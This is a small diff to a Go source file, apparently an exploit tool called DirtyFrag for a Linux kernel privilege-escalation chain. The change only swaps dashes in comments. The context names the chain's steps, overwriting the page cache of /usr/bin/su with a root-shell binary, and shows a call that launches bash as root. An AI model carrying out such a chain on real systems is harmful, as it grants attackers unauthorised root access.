@@ -1,7 +1,7 @@
 package main
 
-// DirtyFrag — Go port of the CVE-2026-43284 / CVE-2026-43500 LPE chain.
-// For educational purposes — study of kernel page-cache write primitives.
+// DirtyFrag - Go port of the CVE-2026-43284 / CVE-2026-43500 LPE chain.
+// For educational purposes - study of kernel page-cache write primitives.
 //
 // Chain:
 //   1. ESP/XFRM path  → overwrites /usr/bin/su page-cache with root-shell ELF
@@ -58,7 +58,7 @@ func main() {
 	}
 
 	if os.Getuid() == 0 {
-		// Already root — just exec a shell.
+		// Already root - just exec a shell.
 		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
 		os.Exit(1)
 	}
